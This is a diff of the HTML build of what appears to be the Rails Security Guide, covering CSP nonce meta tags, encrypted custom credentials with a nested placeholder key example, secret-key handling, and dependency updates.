+<p>Use <a href="https://api.rubyonrails.org/v7.0.0/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag"><code>csp_meta_tag</code></a>
 helper to create a meta tag "csp-nonce" with the per-session nonce value
 for allowing inline <code>&lt;script&gt;</code> tags.</p><div class="code_container">
 <pre><code class="highlight erb"><span class="nt">&lt;head&gt;</span>
   <span class="cp">&lt;%=</span> <span class="n">csp_meta_tag</span> <span class="cp">%&gt;</span>
 <span class="nt">&lt;/head&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-058a09e80257bf054d8140e249a65d75">&lt;head&gt;
+<textarea class="clipboard-content" id="clipboard-3566d13c60c93e8a9704114a9ca72c6d">&lt;head&gt;
   &lt;%= csp_meta_tag %&gt;
 &lt;/head&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-058a09e80257bf054d8140e249a65d75">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-3566d13c60c93e8a9704114a9ca72c6d">Copiar</button>
 </div>
 <p>This is used by the Rails UJS helper to create dynamically
 loaded inline <code>&lt;script&gt;</code> elements.</p><h3 id="environmental-security"><a class="anchorlink" href="#environmental-security">10 Environmental Security</a></h3><p>It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. <code>config/database.yml</code>, master key for <code>credentials.yml</code>, and other unencrypted secrets. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.</p><h4 id="custom-credentials"><a class="anchorlink" href="#custom-credentials">10.1 Custom Credentials</a></h4><p>Rails stores secrets in <code>config/credentials.yml.enc</code>, which is encrypted and hence cannot be edited directly. Rails uses <code>config/master.key</code> or alternatively looks for the environment variable <code>ENV["RAILS_MASTER_KEY"]</code> to encrypt the credentials file. Because the credentials file is encrypted, it can be stored in version control, as long as the master key is kept safe.</p><p>By default, the credentials file contains the application's
@@ -1329,21 +1359,25 @@ loaded inline <code>&lt;script&gt;</code> elements.</p><h3 id="environmental-sec
 For example, with the following decrypted <code>config/credentials.yml.enc</code>:</p><div class="code_container">
 <pre><code class="highlight yaml"><span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">3b7cd72...</span>
 <span class="na">some_api_key</span><span class="pi">:</span> <span class="s">SOMEKEY</span>
+<span class="na">system</span><span class="pi">:</span>
+  <span class="na">access_key_id</span><span class="pi">:</span> <span class="s">1234AB</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-cf576c35cd05b904b05fba59de9e9511">secret_key_base: 3b7cd72...
+<textarea class="clipboard-content" id="clipboard-d7301e7fd7ca9bac08473bdf978f88d1">secret_key_base: 3b7cd72...
 some_api_key: SOMEKEY
+system:
+  access_key_id: 1234AB
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-cf576c35cd05b904b05fba59de9e9511">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-d7301e7fd7ca9bac08473bdf978f88d1">Copiar</button>
 </div>
-<p><code>Rails.application.credentials.some_api_key</code> returns <code>"SOMEKEY"</code>.</p><p>If you want an exception to be raised when some key is blank, you can use the bang
+<p><code>Rails.application.credentials.some_api_key</code> returns <code>"SOMEKEY"</code>. <code>Rails.application.credentials.system.access_key_id</code> returns <code>"1234AB"</code>.</p><p>If you want an exception to be raised when some key is blank, you can use the bang
 version:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="c1"># When some_api_key is blank...</span>
 <span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">credentials</span><span class="p">.</span><span class="nf">some_api_key!</span> <span class="c1"># =&gt; KeyError: :some_api_key is blank</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-acc7af1725060a58384af9db0ee45149"># When some_api_key is blank...
+<textarea class="clipboard-content" id="clipboard-e22fdc800d347136e3cda525defcc799"># When some_api_key is blank...
 Rails.application.credentials.some_api_key! # =&gt; KeyError: :some_api_key is blank
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-acc7af1725060a58384af9db0ee45149">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-e22fdc800d347136e3cda525defcc799">Copiar</button>
 </div>
 <div class="info"><p>Learn more about credentials with <code>bin/rails credentials:help</code>.</p></div><div class="warning"><p>Keep your master key safe. Do not commit your master key.</p></div><h3 id="dependency-management-and-cves"><a class="anchorlink" href="#dependency-management-and-cves">11 Dependency Management and CVEs</a></h3><p>We don’t bump dependencies just to encourage use of new versions, including for security issues. This is because application owners need to manually update their gems regardless of our efforts. Use <code>bundle update --conservative gem_name</code> to safely update vulnerable dependencies.</p><h3 id="additional-resources"><a class="anchorlink" href="#additional-resources">12 Additional Resources</a></h3><p>The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:</p>
 <ul>
@@ -1352,7 +1386,7 @@ Rails.application.credentials.some_api_key! # =&gt; KeyError: :some_api_key is b
 <a href="https://brakemanscanner.org/">Brakeman - Rails Security Scanner</a> - To perform static security analysis for Rails applications.</li>
 <li>
 <a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla's Web Security Guidelines</a> - Recommendations on topics covering Content Security Policy, HTTP headers, Cookies, TLS configuration, etc.</li>
-<li>A <a href="https://www.owasp.org">good security blog</a> including the <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">Cross-Site scripting Cheat Sheet</a>.</li>
+<li>A <a href="https://owasp.org/">good security blog</a> including the <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">Cross-Site scripting Cheat Sheet</a>.</li>
 </ul>
 
 
